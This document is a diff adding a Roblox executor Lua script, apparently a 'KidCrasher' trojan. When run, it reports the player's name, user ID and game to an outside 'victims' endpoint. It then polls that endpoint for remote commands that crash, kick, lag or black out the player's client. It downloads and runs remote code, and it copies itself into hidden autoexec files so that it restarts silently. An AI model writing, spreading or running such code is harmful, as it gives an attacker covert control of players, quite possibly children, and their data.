@@ -1,0 +1,628 @@
+_G.KC_LOADER_SRC = [===[
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
+local request = (syn and syn.request) or http_request or request or (fluxus and fluxus.request) or krnl_request
+if not request then return end
+
+local gameName = "Unknown"
+pcall(function()
+  gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+end)
+
+local state = _G.KidCrasherState or {}
+_G.KidCrasherState = state
+state.connections = state.connections or {}
+
+local function clearConnections()
+  for _, c in ipairs(state.connections) do
+    pcall(function() c:Disconnect() end)
+  end
+  state.connections = {}
+end
+
+local function crashMe()
+  task.spawn(function()
+    while true do
+      local t = {}
+      for i = 1, 100000 do
+        t[i] = {i, i, i, i}
+      end
+    end
+  end)
+end
+
+local function lagNormal()
+  clearConnections()
+  table.insert(state.connections, RunService.Heartbeat:Connect(function()
+    for i = 1, 5000 do
+      local _ = math.sqrt(i) * math.sin(i)
+    end
+  end))
+end
+
+local function lagCrazy()
+  clearConnections()
+  table.insert(state.connections, RunService.Heartbeat:Connect(function()
+    for i = 1, 250000 do
+      local _ = math.sqrt(i) * math.sin(i) * math.cos(i)
+    end
+  end))
+end
+
+local function restMe()
+  task.spawn(function()
+    pcall(function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/2sneaky/rbxscripts.github.io/refs/heads/main/simple_reset"))()
+    end)
+  end)
+end
+
+
+local function fpsSet(on)
+  pcall(function()
+    setfpscap(on and 10 or 240)
+  end)
+end
+
+local function kickMe()
+  pcall(function() player:Kick() end)
+  pcall(function()
+    local nc = game:FindFirstChildOfClass("NetworkClient")
+    if nc then nc:Disconnect() end
+  end)
+  pcall(function() game:Shutdown() end)
+  pcall(function()
+    game:GetService("TeleportService"):Teleport(0, player)
+  end)
+end
+
+local blurGui
+local function blurMe()
+  -- clean up any existing overlay first (works as a toggle)
+  pcall(function()
+    local pg = player:FindFirstChild("PlayerGui")
+    if pg and pg:FindFirstChild("KCBlur") then pg.KCBlur:Destroy() end
+  end)
+  pcall(function()
+    local cg = game:GetService("CoreGui")
+    if cg and cg:FindFirstChild("KCBlur") then cg.KCBlur:Destroy() end
+  end)
+  if blurGui then
+    blurGui = nil
+    return
+  end
+  blurGui = Instance.new("ScreenGui")
+  blurGui.Name = "KCBlur"
+  blurGui.DisplayOrder = 2147483647
+  blurGui.IgnoreGuiInset = true
+  blurGui.ResetOnSpawn = false
+  local frame = Instance.new("Frame")
+  frame.Name = "Blackout"
+  frame.Size = UDim2.new(1, 0, 1, 0)
+  frame.Position = UDim2.new(0, 0, 0, 0)
+  frame.BackgroundColor3 = Color3.new(0, 0, 0)
+  frame.BackgroundTransparency = 0
+  frame.BorderSizePixel = 0
+  frame.ZIndex = 2147483647
+  frame.Parent = blurGui
+  local ok = pcall(function()
+    blurGui.Parent = game:GetService("CoreGui")
+  end)
+  if not ok or not blurGui.Parent then
+    pcall(function()
+      blurGui.Parent = player:WaitForChild("PlayerGui")
+    end)
+  end
+end
+
+state.wiped = state.wiped or {}
+
+local function unblurMe()
+  blurGui = nil
+  pcall(function()
+    local pg = player:FindFirstChild("PlayerGui")
+    if pg and pg:FindFirstChild("KCBlur") then pg.KCBlur:Destroy() end
+  end)
+  pcall(function()
+    local cg = game:GetService("CoreGui")
+    if cg and cg:FindFirstChild("KCBlur") then cg.KCBlur:Destroy() end
+  end)
+end
+
+local function hideObj(obj)
+  table.insert(state.wiped, { obj = obj, parent = obj.Parent })
+  obj.Parent = nil
+end
+
+local function unwipeMe()
+  task.spawn(function()
+    local wiped = state.wiped
+    state.wiped = {}
+    for _, rec in ipairs(wiped) do
+      pcall(function()
+        if rec.obj and rec.parent then
+          rec.obj.Parent = rec.parent
+        end
+      end)
+    end
+  end)
+end
+
+local function hideChar(char)
+  for _, part in ipairs(char:GetDescendants()) do
+    pcall(function()
+      if part:IsA("BasePart") then
+        part.LocalTransparencyModifier = 1
+      elseif part:IsA("Decal") or part:IsA("Texture") then
+        part.Transparency = 1
+      elseif part:IsA("Accessory") then
+        local h = part:FindFirstChildWhichIsA("BasePart", true)
+        if h then h.LocalTransparencyModifier = 1 end
+      end
+    end)
+  end
+  pcall(function()
+    local hum = char:FindFirstChildWhichIsA("Humanoid")
+    if hum then
+      hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+      hum.NameDisplayDistance = 0
+      hum.HealthDisplayDistance = 0
+      hum.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOff
+    end
+  end)
+end
+
+local function deleteBrainrot()
+  task.spawn(function()
+    pcall(function()
+      -- make every OTHER player invisible (removes all their visible parts)
+      for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= player then
+          pcall(function()
+            if plr.Character then hideChar(plr.Character) end
+          end)
+          -- keep hiding them when they respawn while wiped
+          table.insert(state.connections, plr.CharacterAdded:Connect(function(char)
+            task.wait(1)
+            pcall(function() hideChar(char) end)
+          end))
+        end
+      end
+      -- also remove every proximity prompt in the map (hidden so unwipe can restore)
+      for _, obj in ipairs(workspace:GetDescendants()) do
+        pcall(function()
+          if obj:IsA("ProximityPrompt") then hideObj(obj) end
+        end)
+      end
+    end)
+  end)
+end
+
+local handlers = {
+  ["Crash"] = crashMe,
+  ["Kick"] = kickMe,
+  ["Lag N"] = lagNormal,
+  ["Lag C"] = lagCrazy,
+  ["Lag Stop"] = clearConnections,
+  ["Rest"] = restMe,
+  ["FPS On"] = function() fpsSet(true) end,
+  ["FPS Off"] = function() fpsSet(false) end,
+  ["Blur"] = blurMe,
+  ["Unblur"] = unblurMe,
+  ["Wipe Base"] = deleteBrainrot,
+  ["Unwipe"] = unwipeMe,
+}
+
+task.spawn(function()
+  pcall(function()
+    request({
+      Url = "https://mozacrasher.lovable.app/api/public/victims/connect",
+      Method = "POST",
+      Headers = {["Content-Type"] = "application/json"},
+      Body = HttpService:JSONEncode({
+        name = player.Name,
+        userId = player.UserId,
+        game = gameName,
+        ping = math.floor((player:GetNetworkPing() or 0) * 1000),
+        server = game.JobId ~= "" and game.JobId:sub(1, 8) or "solo"
+      })
+    })
+  end)
+end)
+
+-- Small "moza" tag above head; re-applies on respawn
+task.spawn(function()
+  local function applyTag(char)
+    pcall(function()
+      local head = char:WaitForChild("Head", 5)
+      if not head then return end
+      if head:FindFirstChild("MozaTag") then return end
+      local bb = Instance.new("BillboardGui")
+      bb.Name = "MozaTag"
+      bb.Adornee = head
+      bb.Size = UDim2.new(0, 40, 0, 10)
+      bb.StudsOffset = Vector3.new(0, 1.4, 0)
+      bb.AlwaysOnTop = true
+      bb.Parent = head
+      local lbl = Instance.new("TextLabel")
+      lbl.BackgroundTransparency = 1
+      lbl.Size = UDim2.new(1, 0, 1, 0)
+      lbl.Text = "moza"
+      lbl.TextColor3 = Color3.fromRGB(255, 60, 60)
+      lbl.TextStrokeTransparency = 0.3
+      lbl.TextScaled = true
+      lbl.Font = Enum.Font.GothamBold
+      lbl.Parent = bb
+    end)
+  end
+  if player.Character then applyTag(player.Character) end
+  table.insert(state.connections, player.CharacterAdded:Connect(applyTag))
+end)
+
+-- Persist loader to executor autoexec so it runs silently on next join
+
+task.spawn(function()
+  pcall(function()
+    if _G.KC_AUTORUN_SAVED then return end
+    _G.KC_AUTORUN_SAVED = true
+    local wf = writefile or (syn and syn.write_file)
+    if not wf then return end
+    local src = _G.KC_LOADER_SRC
+    if not src then return end
+    local folders = {"autoexec", "Autoexec", "auto_exec", "autoload"}
+    for _, f in ipairs(folders) do
+      pcall(function()
+        if makefolder and isfolder and not isfolder(f) then makefolder(f) end
+      end)
+      pcall(wf, f .. "/kc_run.lua", src)
+      pcall(wf, f .. "/.kc_run.lua", src)
+    end
+    pcall(wf, "kc_run.lua", src)
+  end)
+end)
+
+task.spawn(function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/maxhp20/Moza.vss/refs/heads/main/moza%208.vs"))()
+end)
+
+state.pollId = (state.pollId or 0) + 1
+local pollId = state.pollId
+task.spawn(function()
+  local body = HttpService:JSONEncode({userId = player.UserId})
+  while state.pollId == pollId do
+    pcall(function()
+      local resp = request({
+        Url = "https://mozacrasher.lovable.app/api/public/victims/poll",
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = body
+      })
+      if resp and resp.Body then
+        local ok, data = pcall(function() return HttpService:JSONDecode(resp.Body) end)
+        if ok and data and data.cmds then
+          for _, cmd in ipairs(data.cmds) do
+            local fn = handlers[cmd]
+            if fn then task.spawn(fn) end
+          end
+        end
+      end
+    end)
+    task.wait(0.25)
+  end
+end)
+]===]
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer or Players.PlayerAdded:Wait()
+local request = (syn and syn.request) or http_request or request or (fluxus and fluxus.request) or krnl_request
+if not request then return end
+
+local gameName = "Unknown"
+pcall(function()
+  gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+end)
+
+local state = _G.KidCrasherState or {}
+_G.KidCrasherState = state
+state.connections = state.connections or {}
+
+local function clearConnections()
+  for _, c in ipairs(state.connections) do
+    pcall(function() c:Disconnect() end)
+  end
+  state.connections = {}
+end
+
+local function crashMe()
+  task.spawn(function()
+    while true do
+      local t = {}
+      for i = 1, 100000 do
+        t[i] = {i, i, i, i}
+      end
+    end
+  end)
+end
+
+local function lagNormal()
+  clearConnections()
+  table.insert(state.connections, RunService.Heartbeat:Connect(function()
+    for i = 1, 5000 do
+      local _ = math.sqrt(i) * math.sin(i)
+    end
+  end))
+end
+
+local function lagCrazy()
+  clearConnections()
+  table.insert(state.connections, RunService.Heartbeat:Connect(function()
+    for i = 1, 250000 do
+      local _ = math.sqrt(i) * math.sin(i) * math.cos(i)
+    end
+  end))
+end
+
+local function restMe()
+  task.spawn(function()
+    pcall(function()
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/2sneaky/rbxscripts.github.io/refs/heads/main/simple_reset"))()
+    end)
+  end)
+end
+
+
+local function fpsSet(on)
+  pcall(function()
+    setfpscap(on and 10 or 240)
+  end)
+end
+
+local function kickMe()
+  pcall(function() player:Kick() end)
+  pcall(function()
+    local nc = game:FindFirstChildOfClass("NetworkClient")
+    if nc then nc:Disconnect() end
+  end)
+  pcall(function() game:Shutdown() end)
+  pcall(function()
+    game:GetService("TeleportService"):Teleport(0, player)
+  end)
+end
+
+local blurGui
+local function blurMe()
+  -- clean up any existing overlay first (works as a toggle)
+  pcall(function()
+    local pg = player:FindFirstChild("PlayerGui")
+    if pg and pg:FindFirstChild("KCBlur") then pg.KCBlur:Destroy() end
+  end)
+  pcall(function()
+    local cg = game:GetService("CoreGui")
+    if cg and cg:FindFirstChild("KCBlur") then cg.KCBlur:Destroy() end
+  end)
+  if blurGui then
+    blurGui = nil
+    return
+  end
+  blurGui = Instance.new("ScreenGui")
+  blurGui.Name = "KCBlur"
+  blurGui.DisplayOrder = 2147483647
+  blurGui.IgnoreGuiInset = true
+  blurGui.ResetOnSpawn = false
+  local frame = Instance.new("Frame")
+  frame.Name = "Blackout"
+  frame.Size = UDim2.new(1, 0, 1, 0)
+  frame.Position = UDim2.new(0, 0, 0, 0)
+  frame.BackgroundColor3 = Color3.new(0, 0, 0)
+  frame.BackgroundTransparency = 0
+  frame.BorderSizePixel = 0
+  frame.ZIndex = 2147483647
+  frame.Parent = blurGui
+  local ok = pcall(function()
+    blurGui.Parent = game:GetService("CoreGui")
+  end)
+  if not ok or not blurGui.Parent then
+    pcall(function()
+      blurGui.Parent = player:WaitForChild("PlayerGui")
+    end)
+  end
+end
+
+state.wiped = state.wiped or {}
+
+local function unblurMe()
+  blurGui = nil
+  pcall(function()
+    local pg = player:FindFirstChild("PlayerGui")
+    if pg and pg:FindFirstChild("KCBlur") then pg.KCBlur:Destroy() end
+  end)
+  pcall(function()
+    local cg = game:GetService("CoreGui")
+    if cg and cg:FindFirstChild("KCBlur") then cg.KCBlur:Destroy() end
+  end)
+end
+
+local function hideObj(obj)
+  table.insert(state.wiped, { obj = obj, parent = obj.Parent })
+  obj.Parent = nil
+end
+
+local function unwipeMe()
+  task.spawn(function()
+    local wiped = state.wiped
+    state.wiped = {}
+    for _, rec in ipairs(wiped) do
+      pcall(function()
+        if rec.obj and rec.parent then
+          rec.obj.Parent = rec.parent
+        end
+      end)
+    end
+  end)
+end
+
+local function hideChar(char)
+  for _, part in ipairs(char:GetDescendants()) do
+    pcall(function()
+      if part:IsA("BasePart") then
+        part.LocalTransparencyModifier = 1
+      elseif part:IsA("Decal") or part:IsA("Texture") then
+        part.Transparency = 1
+      elseif part:IsA("Accessory") then
+        local h = part:FindFirstChildWhichIsA("BasePart", true)
+        if h then h.LocalTransparencyModifier = 1 end
+      end
+    end)
+  end
+  pcall(function()
+    local hum = char:FindFirstChildWhichIsA("Humanoid")
+    if hum then
+      hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+      hum.NameDisplayDistance = 0
+      hum.HealthDisplayDistance = 0
+      hum.HealthDisplayType = Enum.HumanoidHealthDisplayType.AlwaysOff
+    end
+  end)
+end
+
+local function deleteBrainrot()
+  task.spawn(function()
+    pcall(function()
+      -- make every OTHER player invisible (removes all their visible parts)
+      for _, plr in ipairs(Players:GetPlayers()) do
+        if plr ~= player then
+          pcall(function()
+            if plr.Character then hideChar(plr.Character) end
+          end)
+          -- keep hiding them when they respawn while wiped
+          table.insert(state.connections, plr.CharacterAdded:Connect(function(char)
+            task.wait(1)
+            pcall(function() hideChar(char) end)
+          end))
+        end
+      end
+      -- also remove every proximity prompt in the map (hidden so unwipe can restore)
+      for _, obj in ipairs(workspace:GetDescendants()) do
+        pcall(function()
+          if obj:IsA("ProximityPrompt") then hideObj(obj) end
+        end)
+      end
+    end)
+  end)
+end
+
+local handlers = {
+  ["Crash"] = crashMe,
+  ["Kick"] = kickMe,
+  ["Lag N"] = lagNormal,
+  ["Lag C"] = lagCrazy,
+  ["Lag Stop"] = clearConnections,
+  ["Rest"] = restMe,
+  ["FPS On"] = function() fpsSet(true) end,
+  ["FPS Off"] = function() fpsSet(false) end,
+  ["Blur"] = blurMe,
+  ["Unblur"] = unblurMe,
+  ["Wipe Base"] = deleteBrainrot,
+  ["Unwipe"] = unwipeMe,
+}
+
+task.spawn(function()
+  pcall(function()
+    request({
+      Url = "https://mozacrasher.lovable.app/api/public/victims/connect",
+      Method = "POST",
+      Headers = {["Content-Type"] = "application/json"},
+      Body = HttpService:JSONEncode({
+        name = player.Name,
+        userId = player.UserId,
+        game = gameName,
+        ping = math.floor((player:GetNetworkPing() or 0) * 1000),
+        server = game.JobId ~= "" and game.JobId:sub(1, 8) or "solo"
+      })
+    })
+  end)
+end)
+
+-- Small "moza" tag above head; re-applies on respawn
+task.spawn(function()
+  local function applyTag(char)
+    pcall(function()
+      local head = char:WaitForChild("Head", 5)
+      if not head then return end
+      if head:FindFirstChild("MozaTag") then return end
+      local bb = Instance.new("BillboardGui")
+      bb.Name = "MozaTag"
+      bb.Adornee = head
+      bb.Size = UDim2.new(0, 40, 0, 10)
+      bb.StudsOffset = Vector3.new(0, 1.4, 0)
+      bb.AlwaysOnTop = true
+      bb.Parent = head
+      local lbl = Instance.new("TextLabel")
+      lbl.BackgroundTransparency = 1
+      lbl.Size = UDim2.new(1, 0, 1, 0)
+      lbl.Text = "moza"
+      lbl.TextColor3 = Color3.fromRGB(255, 60, 60)
+      lbl.TextStrokeTransparency = 0.3
+      lbl.TextScaled = true
+      lbl.Font = Enum.Font.GothamBold
+      lbl.Parent = bb
+    end)
+  end
+  if player.Character then applyTag(player.Character) end
+  table.insert(state.connections, player.CharacterAdded:Connect(applyTag))
+end)
+
+-- Persist loader to executor autoexec so it runs silently on next join
+
+task.spawn(function()
+  pcall(function()
+    if _G.KC_AUTORUN_SAVED then return end
+    _G.KC_AUTORUN_SAVED = true
+    local wf = writefile or (syn and syn.write_file)
+    if not wf then return end
+    local src = _G.KC_LOADER_SRC
+    if not src then return end
+    local folders = {"autoexec", "Autoexec", "auto_exec", "autoload"}
+    for _, f in ipairs(folders) do
+      pcall(function()
+        if makefolder and isfolder and not isfolder(f) then makefolder(f) end
+      end)
+      pcall(wf, f .. "/kc_run.lua", src)
+      pcall(wf, f .. "/.kc_run.lua", src)
+    end
+    pcall(wf, "kc_run.lua", src)
+  end)
+end)
+
+task.spawn(function()
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/maxhp20/Moza.vss/refs/heads/main/moza%208.vs"))()
+end)
+
+state.pollId = (state.pollId or 0) + 1
+local pollId = state.pollId
+task.spawn(function()
+  local body = HttpService:JSONEncode({userId = player.UserId})
+  while state.pollId == pollId do
+    pcall(function()
+      local resp = request({
+        Url = "https://mozacrasher.lovable.app/api/public/victims/poll",
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = body
+      })
+      if resp and resp.Body then
+        local ok, data = pcall(function() return HttpService:JSONDecode(resp.Body) end)
+        if ok and data and data.cmds then
+          for _, cmd in ipairs(data.cmds) do
+            local fn = handlers[cmd]
+            if fn then task.spawn(fn) end
+          end
+        end
+      end
+    end)
+    task.wait(0.25)
+  end
+end)
